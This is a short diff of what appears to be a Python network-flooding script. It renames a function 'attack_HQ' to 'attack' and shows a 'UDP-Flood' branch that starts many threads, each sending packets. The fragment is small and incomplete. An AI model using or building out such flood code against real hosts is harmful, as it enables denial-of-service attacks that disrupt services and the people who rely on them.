@@ -50,9 +50,7 @@ attack_HQ()
 #        if clock.time() > timeout: exit()
 #        if clock.time() < timeout: clock.sleep(0.1)
 
-def attack_HQ():
-    #timeout = clock.time() + time
-    #timer(timeout)
+def attack():
     if method == "UDP-Flood":
         for sequence in range(loops):
             threading.Thread(target=send_packet(375), daemon=True).start()
